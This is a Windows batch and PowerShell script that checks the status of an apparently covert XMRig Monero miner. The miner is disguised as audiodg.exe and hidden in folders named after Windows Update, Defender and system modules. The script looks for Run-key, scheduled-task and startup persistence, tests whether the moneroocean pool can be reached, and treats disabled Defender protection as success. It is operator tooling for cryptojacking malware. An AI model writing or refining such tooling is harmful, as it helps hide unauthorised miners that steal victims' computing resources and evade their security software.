@echo off
title MINER STATUS CHECK
color 0E

REM Change to script directory
cd /d "%~dp0"

cls
echo ================================================================
echo  COMPREHENSIVE MINER STATUS CHECK
echo  Shows exactly what's working and what's not
echo ================================================================
echo.

powershell -NoProfile -Command ^
"Write-Host ''; ^
Write-Host 'CHECKING DEPLOYMENT STATUS...' -ForegroundColor Yellow; ^
Write-Host ''; ^
^
Write-Host '[1] CHECKING DEPLOYMENT LOCATIONS:' -ForegroundColor Cyan; ^
$locations = @( ^
    'C:\ProgramData\Microsoft\Windows\WindowsUpdate', ^
    'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv', ^
    'C:\ProgramData\Microsoft\Network\Downloader', ^
    \"$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\", ^
    \"$env:LOCALAPPDATA\Microsoft\Windows\Defender\", ^
    \"$env:APPDATA\Microsoft\Windows\Templates\", ^
    \"$env:TEMP\WindowsUpdateCache\" ^
); ^
^
$found = 0; ^
foreach ($loc in $locations) { ^
    $minerFiles = @(); ^
    if (Test-Path (Join-Path $loc 'audiodg.exe')) { $minerFiles += 'audiodg.exe' }; ^
    if (Test-Path (Join-Path $loc 'xmrig.exe')) { $minerFiles += 'xmrig.exe' }; ^
    if (Test-Path (Join-Path $loc 'config.json')) { $minerFiles += 'config.json' }; ^
    ^
    if ($minerFiles.Count -gt 0) { ^
        Write-Host ('  [FOUND] ' + $loc) -ForegroundColor Green; ^
        Write-Host ('    Files: ' + ($minerFiles -join ', ')) -ForegroundColor Gray; ^
        $found++; ^
    } ^
} ^
^
if ($found -eq 0) { ^
    Write-Host '  [ERROR] No deployment found!' -ForegroundColor Red; ^
} else { ^
    Write-Host ('  Total: ' + $found + ' location(s) with miner files') -ForegroundColor Yellow; ^
} ^
^
Write-Host ''; ^
Write-Host '[2] CHECKING RUNNING PROCESSES:' -ForegroundColor Cyan; ^
$processes = @(); ^
$processes += Get-Process -Name 'audiodg' -ErrorAction SilentlyContinue | Where-Object { $_.Path -like '*Microsoft*' -or $_.Path -like '*Temp*' }; ^
$processes += Get-Process -Name 'xmrig' -ErrorAction SilentlyContinue; ^
^
if ($processes.Count -gt 0) { ^
    foreach ($proc in $processes) { ^
        Write-Host ('  [RUNNING] ' + $proc.ProcessName + ' (PID: ' + $proc.Id + ')') -ForegroundColor Green; ^
        try { ^
            $cpu = [math]::Round($proc.CPU, 1); ^
            $mem = [math]::Round($proc.WorkingSet64 / 1MB, 0); ^
            Write-Host ('    CPU Time: ' + $cpu + 's | Memory: ' + $mem + ' MB') -ForegroundColor Gray; ^
            Write-Host ('    Path: ' + $proc.Path) -ForegroundColor Gray; ^
        } catch {} ^
    } ^
} else { ^
    Write-Host '  [NOT RUNNING] No miner processes found' -ForegroundColor Red; ^
} ^
^
Write-Host ''; ^
Write-Host '[3] CHECKING PERSISTENCE:' -ForegroundColor Cyan; ^
^
Write-Host '  Checking Registry...' -ForegroundColor Yellow; ^
$regKeys = @( ^
    'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run', ^
    'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' ^
); ^
$regFound = 0; ^
foreach ($key in $regKeys) { ^
    try { ^
        $items = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue; ^
        $props = $items.PSObject.Properties | Where-Object { $_.Value -like '*audiodg*' -or $_.Value -like '*xmrig*' }; ^
        if ($props) { ^
            Write-Host ('    [FOUND] ' + $key) -ForegroundColor Green; ^
            $regFound++; ^
        } ^
    } catch {} ^
} ^
if ($regFound -eq 0) { Write-Host '    [NONE] No registry persistence' -ForegroundColor Gray }; ^
^
Write-Host '  Checking Scheduled Tasks...' -ForegroundColor Yellow; ^
$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like '*Audio*' -or $_.TaskName -like '*Update*' -or $_.Actions.Execute -like '*audiodg*' -or $_.Actions.Execute -like '*xmrig*' }; ^
if ($tasks) { ^
    Write-Host ('    [FOUND] ' + $tasks.Count + ' scheduled task(s)') -ForegroundColor Green; ^
} else { ^
    Write-Host '    [NONE] No scheduled tasks' -ForegroundColor Gray; ^
} ^
^
Write-Host '  Checking Startup Folder...' -ForegroundColor Yellow; ^
$startup = [Environment]::GetFolderPath('Startup'); ^
$startupFiles = Get-ChildItem -Path $startup -Filter '*.vbs' -ErrorAction SilentlyContinue; ^
if ($startupFiles) { ^
    Write-Host ('    [FOUND] ' + $startupFiles.Count + ' startup file(s)') -ForegroundColor Green; ^
} else { ^
    Write-Host '    [NONE] No startup files' -ForegroundColor Gray; ^
} ^
^
Write-Host ''; ^
Write-Host '[4] CHECKING NETWORK CONNECTION:' -ForegroundColor Cyan; ^
try { ^
    $ping = Test-Connection -ComputerName 'gulf.moneroocean.stream' -Count 1 -ErrorAction Stop; ^
    Write-Host '  [OK] Pool is reachable' -ForegroundColor Green; ^
} catch { ^
    Write-Host '  [ERROR] Cannot reach pool' -ForegroundColor Red; ^
} ^
^
Write-Host ''; ^
Write-Host '[5] CHECKING WINDOWS DEFENDER:' -ForegroundColor Cyan; ^
try { ^
    $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue; ^
    if ($defenderStatus.RealTimeProtectionEnabled) { ^
        Write-Host '  [WARNING] Real-time protection is ENABLED' -ForegroundColor Yellow; ^
        Write-Host '    Some features may be blocked' -ForegroundColor Gray; ^
    } else { ^
        Write-Host '  [OK] Real-time protection is disabled' -ForegroundColor Green; ^
    } ^
} catch { ^
    Write-Host '  [INFO] Cannot check Defender status' -ForegroundColor Gray; ^
} ^
^
Write-Host ''; ^
Write-Host '================================================================' -ForegroundColor Cyan; ^
Write-Host ' STATUS CHECK COMPLETE' -ForegroundColor Cyan; ^
Write-Host '================================================================' -ForegroundColor Cyan"

echo.
pause
